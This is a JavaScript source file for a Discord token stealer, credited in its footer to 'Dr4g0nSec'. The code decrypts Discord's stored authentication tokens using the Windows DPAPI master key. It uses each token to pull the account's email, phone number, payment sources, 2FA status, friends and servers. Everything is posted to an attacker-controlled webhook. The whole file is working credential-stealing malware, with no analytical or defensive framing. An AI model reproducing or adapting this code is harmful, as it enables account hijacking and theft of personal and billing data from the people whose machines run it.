const fs = require("fs");
const path = require("path");
const os = require("os");
const crypto = require("crypto");
const axios = require("axios");
const { Dpapi } = require("@primno/dpapi");

const H00K3_URL = "%WEBHOOK%";

const discordPaths = {
  'Discord': '\\discord\\Local Storage\\leveldb\\',
  'Discord Canary': '\\discordcanary\\Local Storage\\leveldb\\',
  'Lightcord': '\\Lightcord\\Local Storage\\leveldb\\',
  'Discord PTB': '\\discordptb\\Local Storage\\leveldb\\'
};

const badgeFlags = {
  1: "<:staff:968704541946167357>",
  2: "<:partner:968704542021652560>",
  4: "<:hypersquad_events:968704541774192693>",
  8: "<:bug_hunter_1:968704541677723648>",
  64: "<:hypersquad_1:968704541501571133>",
  128: "<:hypersquad_2:968704541883261018>",
  256: "<:hypersquad_3:968704541874860082>",
  512: "<:early_supporter:968704542126510090>",
  16384: "<:bug_hunter_2:968704541774217246>",
  131072: "<:verified_dev:968704541702905886>",
  262144: "<:certified_moderator:988996447938674699>",
  4194304: "<:developper:1200219063780130916>"
};

function getAppDataPath() {
  return process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
}

function getMasterKey(localStatePath) {
  const localState = JSON.parse(fs.readFileSync(localStatePath, "utf-8"));
  const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64").slice(5);
  return Dpapi.unprotectData(encryptedKey, null, "CurrentUser");
}

function decryptToken(encrypted, masterKey) {
  try {
    const buffer = Buffer.from(encrypted, "base64");
    if (buffer.length < 15) return null;
    const iv = buffer.slice(3, 15);
    const payload = buffer.slice(15);
    const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
    decipher.setAuthTag(payload.slice(-16));
    const decrypted = Buffer.concat([
      decipher.update(payload.slice(0, -16)),
      decipher.final()
    ]);
    return decrypted.toString("utf8");
  } catch {
    return null;
  }
}

function extractTokensFromPath(leveldbPath, masterKey) {
  const tokens = new Set();
  if (!fs.existsSync(leveldbPath)) return tokens;
  const files = fs.readdirSync(leveldbPath).filter(f => f.endsWith(".log") || f.endsWith(".ldb"));
  for (const file of files) {
    const content = fs.readFileSync(path.join(leveldbPath, file), "utf-8");
    const matches = content.match(/dQw4w9WgXcQ:[^\"]+/g) || [];
    for (const match of matches) {
      const encrypted = match.split("dQw4w9WgXcQ:")[1];
      const token = decryptToken(encrypted, masterKey);
      if (token) tokens.add(token);
    }
  }
  return Array.from(tokens);
}

function getBadges(flags) {
  let badges = "";
  Object.keys(badgeFlags).forEach(flag => {
    if ((flags & flag) == flag) {
      badges += `${badgeFlags[flag]} `;
    }
  });
  return badges.trim();
}

async function getFriendsBadges(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
      headers: { Authorization: token }
    });
    const friends = res.data.filter(f => f.type === 1);
    let friendsWithBadges = "";
    for (const friend of friends.slice(0, 5)) {
      const badges = getBadges(friend.user.public_flags || 0);
      if (badges !== "") {
        friendsWithBadges += `• ${friend.user.username}#${friend.user.discriminator}: ${badges}\n`;
      }
    }
    return friendsWithBadges || "Nenhum.";
  } catch {

  }
}

async function getBillingInfo(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: { Authorization: token }
    });
    if (res.data.length === 0) return "Nenhum.";
    return res.data.map(src => {
      if (src.type === 1) return "<:creditcard:1366960345289195550>";
      if (src.type === 2) return "<:PayPal:1366960065768325150>";
      return null;
    }).join(" | ");
  } catch {
    return null;
  }
}

async function getOwnedServers(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me/guilds", {
      headers: { Authorization: token }
    });
    const guilds = res.data.filter(g => g.owner && g.approximate_member_count > 100);
    return guilds.map(g => `${g.name} | ${g.id}`).join("\n") || "Nenhum.";
  } catch {
  }
}

async function validateToken(token) {
  try {
    const res = await axios.get("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token }
    });
    return res.data;
  } catch {
    return null;
  }
}

async function sendToWebhook(token, user, extras, friendsBadges, ownedGuilds, codes = null) {
  const embed = {
    title: `${user.username} | ${user.id}`,
    color: 0x250e80,
    thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
    fields: [
      { name: "<:hackerblack:1095747410539593800> Token:", value: `\`\`\`${token}\`\`\`\n\n\u200b`, inline: false },
      { name: "<:discordnitro1:1183675764281978975> Nitro:", value: `${extras.nitro}`, inline: true },
      { name: "<a:shadownitro:1183671188350844969> Badges:", value: `${extras.badges || 'Nenhum.'}`, inline: true },
      { name: "<a:creditcard:1183669246857842719> Cobrança:", value: `${extras.billing}`, inline: true },
      { name: "<:duaschavesnochaveiro:1183669306429546526>  2FA:", value: `${extras.mfa}`, inline: true },
      { name: "\u200b", value: "\u200b", inline: false },
      { name: "<:icons8gmail50:1183669308996464650>  Email:", value: `${extras.email}`, inline: true },
      { name: "<:mobilegang11:1183669252411109376> Telefone:", value: `${extras.phone}`, inline: true },
      { name: "\u200b", value: "\u200b", inline: false },
      { name: "<:world:1361777609632911611> HQ Servidores:", value: ownedGuilds, inline: false },
      { name: "<:siyahtoplum94:1183669256269869116>  HQ Amigos:", value: friendsBadges, inline: false }
    ],
    footer: {
      text: "Created by: sk4rty and execute | Dr4g0nSec on Top!",
      icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400&u=11e73b9dcb21c916c430fd7a540e6d54bd3a1657&v=4"
    }
  };

  if (codes) {
    embed.fields.push({ name: "<a:gift:1021608479808569435> Códigos Gifts:", value: codes, inline: false });
    embed.fields.push({ name: "\u200b", value: "\u200b", inline: false });
  }

  await axios.post(H00K3_URL, {
    username: "Dr4g0nSec | Informações do Usuário",
    avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
    embeds: [embed]
  }).catch(console.error);
}

async function main() {
  const appData = getAppDataPath();
  for (const [name, relativePath] of Object.entries(discordPaths)) {
    const basePath = path.join(appData, relativePath.split("\\Local")[0]);
    const localStatePath = path.join(basePath, 'Local State');
    const leveldbPath = path.join(appData, relativePath);
    if (!fs.existsSync(localStatePath) || !fs.existsSync(leveldbPath)) continue;
    const masterKey = getMasterKey(localStatePath);
    const tokens = extractTokensFromPath(leveldbPath, masterKey);
    for (const token of tokens) {
      const user = await validateToken(token);
      if (user) {
        const billing = await getBillingInfo(token);
        const extras = {
          nitro: user.premium_type === 1 ? "Clássico" : user.premium_type === 2 ? "Premium" : "Não possui.",
          mfa: user.mfa_enabled ? "Ativado" : "Não possui.",
          phone: user.phone || "Não possui.",
          email: user.email || "Não possui.",
          badges: getBadges(user.public_flags),
          billing
        };
        const friendsBadges = await getFriendsBadges(token);
        const ownedGuilds = await getOwnedServers(token);
        await sendToWebhook(token, user, extras, friendsBadges, ownedGuilds);
      }
    }
  }
}

main();
